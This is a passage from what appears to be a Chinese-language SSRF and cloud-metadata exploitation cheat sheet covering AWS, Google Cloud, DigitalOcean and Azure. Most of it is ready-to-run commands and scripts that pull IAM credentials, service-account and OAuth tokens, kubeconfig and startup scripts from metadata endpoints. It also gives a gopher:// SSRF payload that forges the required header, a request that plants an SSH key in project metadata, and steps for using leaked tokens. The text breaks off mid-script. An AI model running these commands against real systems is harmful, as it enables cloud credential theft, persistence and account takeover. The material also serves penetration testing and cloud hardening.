+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.170.2/v2/credentials/&lt;UUID&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(3)Elastic Beanstalk</p>
+<p>从API中检索accountId和region</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/dynamic/instance-identity/document</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role</span><br></pre></td></tr></table></figure>
+
+<p>然后从API中检索AccessKeyId、SecretAccessKey和Token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role</span><br></pre></td></tr></table></figure>
+
+<p>然后我们将凭证与之一起使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/</span><br></pre></td></tr></table></figure>
+
+<p>(4)Lambda</p>
+<p>AWS Lambda为自定义运行时提供HTTP API，以从Lambda接收调用事件并将响应数据发送回Lambda执行环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9001/2018-06-01/runtime/invocation/next</span><br><span class="line">$ curl &quot;http://$&#123;AWS_LAMBDA_RUNTIME_API&#125;/2018-06-01/runtime/invocation/next&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Google-Cloud"><a href="#Google-Cloud" class="headerlink" title="Google Cloud"></a>Google Cloud</h3><p>需要”Metadata-Flavor: Google”或”X-Google-Metadata-Request: True”标头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/computeMetadata/v1/</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1/</span><br><span class="line">http://metadata/computeMetadata/v1/</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1/instance/hostname</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1/instance/id</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1/project/project-id</span><br></pre></td></tr></table></figure>
+
+<p>提取有趣端点的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"># /project</span><br><span class="line"># 项目名称及编号</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/project/project-id</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/project/numeric-project-id</span><br><span class="line"># 项目属性</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/project/attributes/?recursive=true</span><br><span class="line"></span><br><span class="line"># /oslogin</span><br><span class="line"># users</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/oslogin/users</span><br><span class="line"># groups</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/oslogin/groups</span><br><span class="line"># security-keys</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/oslogin/security-keys</span><br><span class="line"># authorize</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/oslogin/authorize</span><br><span class="line"></span><br><span class="line"># /instance</span><br><span class="line"># Description</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/instance/description</span><br><span class="line"># Hostname</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/instance/hostname</span><br><span class="line"># ID</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/instance/id</span><br><span class="line"># Image</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/instance/image</span><br><span class="line"># Machine Type</span><br><span class="line">curl -s -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/machine-type</span><br><span class="line"># Name</span><br><span class="line">curl -s -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/name</span><br><span class="line"># Tags</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/scheduling/tags</span><br><span class="line"># Zone</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/zone</span><br><span class="line"># User data</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/attributes/startup-script&quot;</span><br><span class="line"># 网络接口</span><br><span class="line">for iface in $(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/network-interfaces/&quot;); do</span><br><span class="line">    echo &quot;  IP: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip&quot;)</span><br><span class="line">    echo &quot;  Subnetmask: &quot;$(curl -s -f -H &quot;X-Google-Metadata-Request: True&quot; &quot;http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask&quot;)</span><br><span class="line">    echo &quot;  Gateway: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway&quot;)</span><br><span class="line">    echo &quot;  DNS: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers&quot;)</span><br><span class="line">    echo &quot;  Network: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network&quot;)</span><br><span class="line">    echo &quot;  ==============  &quot;</span><br><span class="line">done</span><br><span class="line"># 服务账户</span><br><span class="line">for sa in $(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/&quot;); do</span><br><span class="line">    echo &quot;  Name: $sa&quot;</span><br><span class="line">    echo &quot;  Email: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;email&quot;)</span><br><span class="line">    echo &quot;  Aliases: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;aliases&quot;)</span><br><span class="line">    echo &quot;  Identity: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;identity&quot;)</span><br><span class="line">    echo &quot;  Scopes: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;scopes&quot;)</span><br><span class="line">    echo &quot;  Token: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;token&quot;)</span><br><span class="line">    echo &quot;  ==============  &quot;</span><br><span class="line">done</span><br><span class="line"># K8s 属性</span><br><span class="line">## 集群位置</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/attributes/cluster-location</span><br><span class="line">## 集群名称</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/attributes/cluster-name</span><br><span class="line">## Os-login enabled</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin</span><br><span class="line">## Kube-env</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/attributes/kube-env</span><br><span class="line">## Kube-labels</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/attributes/kube-labels</span><br><span class="line">## Kubeconfig</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/attributes/kubeconfig</span><br><span class="line"></span><br><span class="line"># 所有自定义项目属性</span><br><span class="line">curl &quot;http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&amp;alt=text&quot; \</span><br><span class="line">    -H &quot;Metadata-Flavor: Google&quot;</span><br><span class="line"></span><br><span class="line"># 所有自定义项目实例属性</span><br><span class="line">curl &quot;http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&amp;alt=text&quot; \</span><br><span class="line">    -H &quot;Metadata-Flavor: Google&quot;</span><br></pre></td></tr></table></figure>
+
+<p>递归拉取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true</span><br></pre></td></tr></table></figure>
+
+<p>Beta不需要标头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true</span><br></pre></td></tr></table></figure>
+
+<p>使用Gopher SSRF设置所需的标头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>有趣的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SSH公钥</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json</span><br><span class="line"></span><br><span class="line">获取访问令牌</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</span><br><span class="line"></span><br><span class="line">Kubernetes</span><br><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json</span><br></pre></td></tr></table></figure>
+
+<p>(1)添加SSH密钥</p>
+<p>提取令牌</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json</span><br></pre></td></tr></table></figure>
+
+<p>检查令牌的范围</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;issued_to&quot;</span>: <span class="string">&quot;101302079XXXXX&quot;</span>,</span><br><span class="line">        <span class="string">&quot;audience&quot;</span>: <span class="string">&quot;10130207XXXXX&quot;</span>,</span><br><span class="line">        <span class="string">&quot;scope&quot;</span>: <span class="string">&quot;https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring&quot;</span>,</span><br><span class="line">        <span class="string">&quot;expires_in&quot;</span>: 2443,</span><br><span class="line">        <span class="string">&quot;access_type&quot;</span>: <span class="string">&quot;offline&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交SSH密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata&quot;</span></span><br><span class="line">-H <span class="string">&quot;Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA&quot;</span></span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span></span><br><span class="line">--data <span class="string">&#x27;&#123;&quot;items&quot;: [&#123;&quot;key&quot;: &quot;sshkeyname&quot;, &quot;value&quot;: &quot;sshkeyvalue&quot;&#125;]&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>(2)使用泄露的服务账户令牌</p>
+<p>通过环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLOUDSDK_AUTH_ACCESS_TOKEN=&lt;token&gt;</span><br><span class="line">gcloud projects list</span><br></pre></td></tr></table></figure>
+
+<p>通过设置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;token&gt;&quot;</span> &gt; /some/path/to/token</span><br><span class="line">gcloud config <span class="built_in">set</span> auth/access_token_file /some/path/to/token</span><br><span class="line">gcloud projects list</span><br><span class="line">gcloud config <span class="built_in">unset</span> auth/access_token_file</span><br></pre></td></tr></table></figure>
+
+<p>(3)云功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># /project</span><br><span class="line"># Project name and number</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/project/project-id</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/project/numeric-project-id</span><br><span class="line"></span><br><span class="line"># /instance</span><br><span class="line"># ID</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/instance/id</span><br><span class="line"># Zone</span><br><span class="line">curl -s -f -H &quot;Metadata-Flavor: Google&quot; http://metadata/computeMetadata/v1/instance/zone</span><br><span class="line"># Auto MTLS config</span><br><span class="line">curl -s -H &quot;Metadata-Flavor:Google&quot; http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration</span><br><span class="line"># Service Accounts</span><br><span class="line">for sa in $(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/&quot;); do</span><br><span class="line">    echo &quot;  Name: $sa&quot;</span><br><span class="line">    echo &quot;  Email: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;email&quot;)</span><br><span class="line">    echo &quot;  Aliases: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;aliases&quot;)</span><br><span class="line">    echo &quot;  Identity: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;identity&quot;)</span><br><span class="line">    echo &quot;  Scopes: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;scopes&quot;)</span><br><span class="line">    echo &quot;  Token: &quot;$(curl -s -f -H &quot;Metadata-Flavor: Google&quot; &quot;http://metadata/computeMetadata/v1/instance/service-accounts/$&#123;sa&#125;token&quot;)</span><br><span class="line">    echo &quot;  ==============  &quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h3 id="Digital-Ocean"><a href="#Digital-Ocean" class="headerlink" title="Digital Ocean"></a>Digital Ocean</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/metadata/v1/id</span><br><span class="line">http://169.254.169.254/metadata/v1.json</span><br><span class="line">http://169.254.169.254/metadata/v1/</span><br><span class="line">http://169.254.169.254/metadata/v1/id</span><br><span class="line">http://169.254.169.254/metadata/v1/user-data</span><br><span class="line">http://169.254.169.254/metadata/v1/hostname</span><br><span class="line">http://169.254.169.254/metadata/v1/region</span><br><span class="line">http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address</span><br><span class="line"></span><br><span class="line">curl http://169.254.169.254/metadata/v1.json | jq</span><br></pre></td></tr></table></figure>
+
+<h3 id="Packetcloud"><a href="#Packetcloud" class="headerlink" title="Packetcloud"></a>Packetcloud</h3><p><a target="_blank" rel="noopener" href="https://metadata.packet.net/userdata">文档</a></p>
+<h3 id="Azure"><a href="#Azure" class="headerlink" title="Azure"></a>Azure</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/metadata/v1/maintenance</span><br></pre></td></tr></table></figure>
+
+<p>2017后，添加”Metadata: true”标头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/metadata/instance?api-version=2017-04-02</span><br><span class="line">http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<p>(1)Bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HEADER=<span class="string">&quot;Metadata:true&quot;</span></span><br><span class="line">URL=<span class="string">&quot;http://169.254.169.254/metadata&quot;</span></span><br><span class="line">API_VERSION=<span class="string">&quot;2021-12-13&quot;</span> <span class="comment">#https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Instance details&quot;</span></span><br><span class="line">curl -s -f -H <span class="string">&quot;<span class="variable">$HEADER</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/instance?api-version=<span class="variable">$API_VERSION</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Load Balancer details&quot;</span></span><br><span class="line">curl -s -f -H <span class="string">&quot;<span class="variable">$HEADER</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/loadbalancer?api-version=<span class="variable">$API_VERSION</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Management Token&quot;</span></span><br><span class="line">curl -s -f -H <span class="string">&quot;<span class="variable">$HEADER</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/identity/oauth2/token?api-version=<span class="variable">$API_VERSION</span>&amp;resource=https://management.azure.com/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Graph token&quot;</span></span><br><span class="line">curl -s -f -H <span class="string">&quot;<span class="variable">$HEADER</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/identity/oauth2/token?api-version=<span class="variable">$API_VERSION</span>&amp;resource=https://graph.microsoft.com/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Vault token&quot;</span></span><br><span class="line">curl -s -f -H <span class="string">&quot;<span class="variable">$HEADER</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/identity/oauth2/token?api-version=<span class="variable">$API_VERSION</span>&amp;resource=https://vault.azure.net/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Storage token&quot;</span></span><br><span class="line">curl -s -f -H <span class="string">&quot;<span class="variable">$HEADER</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/identity/oauth2/token?api-version=<span class="variable">$API_VERSION</span>&amp;resource=https://storage.azure.com/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>(2)PowerShell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Powershell</span></span><br><span class="line">Invoke-RestMethod -Headers @&#123;<span class="string">&quot;Metadata&quot;</span>=<span class="string">&quot;true&quot;</span>&#125; -Method GET -NoProxy -Uri <span class="string">&quot;http://169.254.169.254/metadata/instance?api-version=2021-02-01&quot;</span> | ConvertTo-Json -Depth 64</span><br><span class="line"><span class="comment">## 用户数据</span></span><br><span class="line"><span class="variable">$userData</span> = Invoke- RestMethod -Headers @&#123;<span class="string">&quot;Metadata&quot;</span>=<span class="string">&quot;true&quot;</span>&#125; -Method GET -Uri <span class="string">&quot;http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&amp;format=text&quot;</span></span><br><span class="line">[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(<span class="variable">$userData</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径</span></span><br><span class="line">/metadata/instance?api-version=2017-04-02</span><br><span class="line">/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text</span><br><span class="line">/metadata/instance/compute/userData?api-version=2021-01-01&amp;format=text</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>Azure App</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查这些环境变量以了解目前是否在Azure app环境中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$IDENTITY_HEADER</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$IDENTITY_ENDPOINT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查文件夹</span></span><br><span class="line"><span class="built_in">ls</span> /opt/microsoft</span><br><span class="line"><span class="built_in">ls</span> /opt/microsoft/msodbcsql17</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取管理令牌</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$IDENTITY_ENDPOINT</span>?resource=https://management.azure.com/&amp;api-version=2017-09-01&quot;</span> -H secret:<span class="variable">$IDENTITY_HEADER</span></span><br><span class="line"><span class="comment"># 获取graph令牌</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$IDENTITY_ENDPOINT</span>?resource=https://graph.azure.com/&amp;api-version=2017-09-01&quot;</span> -H secret:<span class="variable">$IDENTITY_HEADER</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># API</span></span><br><span class="line"><span class="comment"># 获取订阅</span></span><br><span class="line">URL=<span class="string">&quot;https://management.azure.com/subscriptions?api-version=2020-01-01&quot;</span></span><br><span class="line">curl -H <span class="string">&quot;Authorization: <span class="variable">$TOKEN</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>&quot;</span></span><br><span class="line"><span class="comment"># 获取订阅中资源的权限</span></span><br><span class="line">URL=<span class="string">&quot;https://management.azure.com/subscriptions/&lt;subscription-uid&gt;/resources?api-version=2020-10-01&#x27;&quot;</span></span><br><span class="line">curl -H <span class="string">&quot;Authorization: <span class="variable">$TOKEN</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>&quot;</span></span><br><span class="line"><span class="comment"># 获取VM的权限</span></span><br><span class="line">URL=<span class="string">&quot;https://management.azure.com/subscriptions/&lt;subscription-uid&gt;/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/&lt;VM-name&gt;/providers/Microsoft.Authorization/permissions?api-version=2015-07-01&quot;</span></span><br><span class="line">curl -H <span class="string">&quot;Authorization: <span class="variable">$TOKEN</span>&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerShell中向管理端点发送API请求</span></span><br><span class="line"><span class="variable">$Token</span> = <span class="string">&#x27;eyJ0eX..&#x27;</span></span><br><span class="line"><span class="variable">$URI</span>=<span class="string">&#x27;https://management.azure.com/subscriptions?api-version=2020-01-01&#x27;</span></span><br><span class="line"><span class="variable">$RequestParams</span> = @&#123;</span><br><span class="line"> Method = <span class="string">&#x27;GET&#x27;</span></span><br><span class="line"> Uri = <span class="variable">$URI</span></span><br><span class="line"> Headers = @&#123;</span><br><span class="line">  <span class="string">&#x27;Authorization&#x27;</span> = <span 